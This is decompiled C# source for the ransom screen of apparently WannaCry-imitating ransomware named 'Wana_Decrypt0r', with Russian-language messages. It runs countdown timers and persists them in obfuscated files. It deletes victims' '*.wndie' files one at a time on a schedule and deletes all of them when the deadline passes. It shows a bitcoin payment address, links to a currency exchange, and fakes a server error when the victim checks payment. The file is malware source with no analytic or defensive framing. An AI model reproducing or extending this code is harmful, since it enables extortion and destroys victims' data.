using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Wana_Decrypt0r.Properties;

namespace Wana_Decrypt0r
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : Form
	{
		// Token: 0x06000007 RID: 7 RVA: 0x0000210C File Offset: 0x0000030C
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002144 File Offset: 0x00000344
		private static string[] smethod_0(string string_1)
		{
			return Directory.GetDirectories(string_1);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002158 File Offset: 0x00000358
		private static string[] smethod_1(string string_1, string string_2)
		{
			return Directory.GetFiles(string_1, string_2, SearchOption.AllDirectories);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002170 File Offset: 0x00000370
		public static string smethod_2(string string_1)
		{
			string text = string.Empty;
			foreach (char c in string_1)
			{
				text += (c + '\u000f').ToString();
			}
			return text;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000021B4 File Offset: 0x000003B4
		public static string smethod_3(string string_1)
		{
			string_1 += "!@#b$%G23!@#$%^&*()_46Jherjr^&()_+";
			byte[] bytes = Encoding.Unicode.GetBytes(string_1);
			byte[] array = new SHA256Managed().ComputeHash(bytes);
			string text = string.Empty;
			foreach (byte b in array)
			{
				text += string.Format("{0:x2}", b);
			}
			return text.Substring(53);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002224 File Offset: 0x00000424
		public static string smethod_4(string string_1)
		{
			string text = string.Empty;
			foreach (char c in string_1)
			{
				text += (c - '\u000f').ToString();
			}
			return text;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002268 File Offset: 0x00000468
		private void Form1_Load(object sender, EventArgs e)
		{
			if (File.Exists("a.wndi") && File.Exists("t.wndi") && File.Exists("d.wndi"))
			{
				this.int_1 = Convert.ToInt32(Form1.smethod_4(File.ReadAllText("a.wndi")));
				this.int_0 = Convert.ToInt32(Form1.smethod_4(File.ReadAllText("t.wndi")));
				this.int_2 = Convert.ToInt32(Form1.smethod_4(File.ReadAllText("d.wndi")));
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000022E8 File Offset: 0x000004E8
		private void method_0()
		{
			string[] array = Form1.smethod_0(("c:\\users\\" + Environment.UserName) ?? "");
			string[] array2 = new string[]
			{
				"*.wndie"
			};
			Directory.GetLogicalDrives();
			foreach (string string_ in array)
			{
				try
				{
					for (int j = 0; j < array2.Length; j++)
					{
						this.string_0 = Form1.smethod_1(string_, array2[j]);
						foreach (string path in this.string_0)
						{
							string text = Path.GetFullPath(path);
							string extension = Path.GetExtension(path);
							string text2 = Path.GetFileName(path);
							text2 = text2.Replace(extension, "");
							text = text.Replace(text2 + extension, "");
							File.Delete(path);
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000023E4 File Offset: 0x000005E4
		private void timer_0_Tick(object sender, EventArgs e)
		{
			this.int_1--;
			this.int_0--;
			this.int_2--;
			if (this.int_1 > 0)
			{
				this.verticalProgressBar2.Value = this.int_1;
				this.verticalProgressBar1.Value = this.int_0;
				this.verticalProgressBar3.Value = this.int_2;
				this.label1.Text = TimeSpan.FromSeconds((double)this.int_1).ToString("dd\\:h\\:mm\\:ss");
				this.label6.Text = TimeSpan.FromSeconds((double)this.int_0).ToString("dd\\:h\\:mm\\:ss");
				this.label9.Text = TimeSpan.FromSeconds((double)this.int_2).ToString("dd\\:h\\:mm\\:ss");
				File.WriteAllText("a.wndi", Form1.smethod_2(this.int_1.ToString()));
				File.WriteAllText("t.wndi", Form1.smethod_2(this.int_0.ToString()));
				File.WriteAllText("d.wndi", Form1.smethod_2(this.int_2.ToString()));
				if (this.int_2 == 0)
				{
					this.method_2();
					this.int_2 = 70;
					return;
				}
			}
			else
			{
				this.method_0();
				this.timer_0.Stop();
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x0000253C File Offset: 0x0000073C
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000254C File Offset: 0x0000074C
		private void method_2()
		{
			string[] array = Form1.smethod_0(("c:\\users\\" + Environment.UserName) ?? "");
			string[] array2 = new string[]
			{
				"*.wndie"
			};
			Directory.GetLogicalDrives();
			foreach (string string_ in array)
			{
				try
				{
					for (int j = 0; j < array2.Length; j++)
					{
						this.string_0 = Form1.smethod_1(string_, array2[j]);
						string[] array4 = this.string_0;
						int num = 0;
						if (0 < array4.Length)
						{
							string path = array4[num];
							string text = Path.GetFullPath(path);
							string extension = Path.GetExtension(path);
							string text2 = Path.GetFileName(path);
							text2 = text2.Replace(extension, "");
							text = text.Replace(text2 + extension, "");
							File.Delete(text + text2 + extension);
							return;
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000253C File Offset: 0x0000073C
		private void timer_1_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000253C File Offset: 0x0000073C
		private void method_3(object sender, EventArgs e)
		{
		}

		// Token: 0x06000014 RID: 20 RVA: 0x0000253C File Offset: 0x0000073C
		private void button3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002648 File Offset: 0x00000848
		private void textBox1_Click(object sender, EventArgs e)
		{
			this.textBox1.Text = string.Empty;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000253C File Offset: 0x0000073C
		private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002668 File Offset: 0x00000868
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://ru.wikipedia.org/wiki/%D0%91%D0%B8%D1%82%D0%BA%D0%BE%D0%B9%D0%BD");
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002680 File Offset: 0x00000880
		private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://www.bestchange.ru/qiwi-to-bitcoin.html");
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002698 File Offset: 0x00000898
		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				Clipboard.SetText(this.textBox3.Text);
				MessageBox.Show("bitcoin адрес был скопирован!", "Информация", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Произошла ошибка во время копирования, повторите попытку!", "Информация", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000026F0 File Offset: 0x000008F0
		private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Thread.Sleep(3000);
			MessageBox.Show("Ошибка подключения к серверам!", "Ошибка", MessageBoxButtons.OK);
		}

		// Token: 0x04000004 RID: 4
		private int int_0 = 200400;

		// Token: 0x04000005 RID: 5
		private int int_1 = 600400;

		// Token: 0x04000006 RID: 6
		private int int_2 = 70;

		// Token: 0x04000007 RID: 7
		private string[] string_0;
	}
}
